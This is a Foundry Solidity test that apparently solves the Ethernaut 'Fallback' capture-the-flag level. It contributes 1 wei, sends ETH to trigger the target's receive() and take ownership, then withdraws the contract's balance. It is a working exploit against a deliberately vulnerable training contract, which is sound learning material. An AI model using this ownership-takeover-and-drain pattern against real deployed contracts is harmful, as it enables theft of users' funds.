// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IFallback {
  function contribute() external payable;
  function withdraw() external;
}

contract FallbackTest is Test {
  address internal challengeAddress;
  IFallback internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x3c99F231E92c4F0009aC726dd310Bd76d1c755bB);
    challenge = IFallback(challengeAddress);
  }

  function testExploit() public {
    // make this true
    // contributions[msg.sender] > 0
    challenge.contribute{value: 1 wei}();

    // trigger code in receive()
    (bool success,) = address(challengeAddress).call{value: 1 wei}("");
    require(success, "receiver rejected ETH transfer");

    // See the comment in receive() below
    challenge.withdraw();

    utils.submitLevelInstance(challengeAddress);
  }

  // we need a receive function, since we are receiving
  // the funds here and this is not an EOA
  receive() external payable {}
}
